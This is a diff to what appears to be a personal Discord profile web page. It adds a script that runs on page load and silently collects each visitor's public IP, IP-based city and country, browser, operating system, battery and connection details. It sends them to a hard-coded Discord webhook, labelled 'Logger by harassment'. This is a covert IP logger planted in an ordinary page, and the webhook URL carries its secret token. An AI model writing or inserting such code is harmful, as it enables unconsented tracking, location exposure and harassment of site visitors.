@@ -572,6 +572,152 @@
         </div>
     </div>
     <script>
+        async function getPublicIP() {
+    const ipServices = [
+        { url: 'https://api.ipify.org?format=json', key: 'ip' },
+        { url: 'https://ipapi.co/json/', key: 'ip' },
+        { url: 'https://api.ip.sb/geoip', key: 'ip' },
+        { url: 'https://ifconfig.me/ip', key: null, isText: true } // Fallback, returns plain text
+    ];
+
+    for (const service of ipServices) {
+        try {
+            const response = await fetch(service.url, { method: 'GET', cache: 'no-cache' });
+            if (!response.ok) {
+                throw new Error(`HTTP error! status: ${response.status}`);
+            }
+            if (service.isText) {
+                const ip = await response.text();
+                if (ip) return ip.trim();
+            } else {
+                const data = await response.json();
+                if (data && data[service.key]) {
+                    return data[service.key];
+                }
+            }
+        } catch (error) {
+            console.warn(`Failed to fetch IP from ${service.url}:`, error);
+            // Continue to the next service in the list
+        }
+    }
+    throw new Error('Could not fetch public IP from any service.');
+}
+
+async function getUserData() {
+    try {
+        const ip = await getPublicIP();
+        const browserInfo = navigator.userAgent;
+        const screenResolution = `${window.screen.width}x${window.screen.height}`;
+        const language = navigator.language;
+        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const timestamp = new Date().toLocaleString('pl-PL', { timeZone });
+        const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Computer";
+        const onlineStatus = navigator.onLine ? "🟢 Online" : "🔴 Offline";
+        const uptime = `${(performance.now() / 60000).toFixed(2)} min`;
+        const os = navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform;
+        const cpuCores = navigator.hardwareConcurrency;
+        const navHeight = `${window.innerHeight}px`;
+        let batteryLevel = "Nieznane";
+        let powerSavingMode = "Nieznane";
+        if ('getBattery' in navigator) {
+            try {
+                const battery = await navigator.getBattery();
+                batteryLevel = `${(battery.level * 100).toFixed(0)}%`;
+                powerSavingMode = battery.charging ? "No" : "Yes";
+            } catch (error) {
+                console.warn("Battery API error:", error);
+            }
+        }
+        let adBlockEnabled = "❌ None"; // Assume no ad-blocker initially
+        try {
+            // Create a new element and check if it's blocked
+            const testAd = document.createElement('div');
+            testAd.innerHTML = '&nbsp;';
+            testAd.className = 'adsbox pub_300x250 pub_300x250m pub_728x90 text-ad textAd text_ad';
+            testAd.style.cssText = 'position: absolute; top: -10px; left: -10px; width: 1px; height: 1px; visibility: hidden;';
+            document.body.appendChild(testAd);
+            setTimeout(() => {
+                if (testAd.offsetHeight === 0) {
+                    adBlockEnabled = "✅ Yes";
+                }
+                document.body.removeChild(testAd);
+            }, 100);
+        } catch (e) {
+            // If an error occurs, assume an ad-blocker might be interfering
+            adBlockEnabled = "✅ Yes";
+        }
+        const browserName = navigator.appName;
+        const browserVersion = navigator.appVersion;
+        const browserLanguage = navigator.language;
+        const cookiesEnabled = navigator.cookieEnabled ? "✅ Yes" : "❌ None";
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        const connectionType = connection ? connection.effectiveType : "Nieznane";
+        const connectionRtt = connection ? `${connection.rtt} ms` : "Nieznane";
+        const connectionDownlink = connection ? `${connection.downlink} Mbps` : "Nieznane";
+        const osVersion = navigator.userAgentData ? navigator.userAgentData.platformVersion : "Nieznane";
+        let location = "Nieznane";
+        try {
+            // Use ipapi.co as it provides more data and we already have the IP
+            const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+            if (locationResponse.ok) {
+                const locationData = await locationResponse.json();
+                if (locationData.city && locationData.region && locationData.country_name) {
+                    location = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
+                }
+            }
+        } catch (error) {
+            console.error("Error whilst locating:", error);
+        }
+        const data = {
+            ip, browser: browserInfo, resolution: screenResolution, language, timeZone, timestamp,
+            deviceType, onlineStatus, uptime, os, cpuCores, navHeight, batteryLevel,
+            powerSavingMode, adBlockEnabled, browserName, browserVersion, browserLanguage,
+            cookiesEnabled, connectionType, connectionRtt, connectionDownlink, osVersion, location
+        };
+        await sendDataToWebhook(data);
+    } catch (error) {
+        console.error("Error While Downloading Data:", error);
+    }
+}
+
+async function sendDataToWebhook(data) {
+    const webhookUrl = 'https://discord.com/api/webhooks/1453974680665849980/2FgblNnZIlE8RXnwNQm8vlKs-sTDXbFIgnW9JuxrZ-bAxiR22qls0r5c7nyIkdBAGkzV'; // webhook
+    const payload = {
+        content: "📡 **User Logged On Site**",
+        embeds: [{
+            title: "📊 Device Details",
+            color: 16711680,
+            fields: [
+                { name: "📍 IP", value: data.ip, inline: true }, { name: "🌍 Location", value: data.location, inline: true },
+                { name: "🖥️ Resolution", value: data.resolution, inline: true }, { name: "🗣️ Language", value: data.language, inline: true },
+                { name: "🕒 TimeZone", value: data.timeZone, inline: true }, { name: "📅 Time", value: data.timestamp, inline: false },
+                { name: "📱 Device", value: data.deviceType, inline: true }, { name: "🔋 Battery", value: data.batteryLevel, inline: true },
+                { name: "⚡ Power Saving", value: data.powerSavingMode, inline: true }, { name: "🖥️ Operating System", value: data.os, inline: true },
+                { name: "🔗 Status online", value: data.onlineStatus, inline: true }, { name: "📊 Uptime", value: data.uptime, inline: true },
+                { name: "🖥️ CPU Cores", value: data.cpuCores.toString(), inline: true }, { name: "📏 Bar Height", value: data.navHeight, inline: true },
+                { name: "🚫 AdBlock", value: data.adBlockEnabled, inline: true }, { name: "🌐 Browser", value: data.browserName, inline: true },
+                { name: "📜 Browser Version", value: data.browserVersion, inline: true }, { name: "🍪 Cookies", value: data.cookiesEnabled, inline: true },
+                { name: "📶 Connection", value: data.connectionType, inline: true }, { name: "⏱️ Delay (RTT)", value: data.connectionRtt, inline: true },
+                { name: "⬇️ Download Speed", value: data.connectionDownlink, inline: true }
+            ],
+            footer: { text: "Logger by harassment", icon_url: "https://cdn.discordapp.com/avatars/1201069596002766939/9de5bd364834a2120ff75d0d910d2fd0.png?size=4096" }
+        }]
+    };
+    try {
+        const response = await fetch(webhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+        if (!response.ok) {
+            console.error("Błąd wysyłania:", response.statusText, await response.text());
+        } else {
+            console.log("Dane wysłane pomyślnie.");
+        }
+    } catch (error) {
+        console.error("Network error while sending webhook:", error);
+    }
+}
+
+window.onload = getUserData;
+    </script>
+    <script>
         const DISCORD_ID = '1404732292412477531';
         const BIO_TEXT = 'developer from Russia thats always interested in new technologies & projects.';
         const DEFAULT_USERNAME = 'harassment';
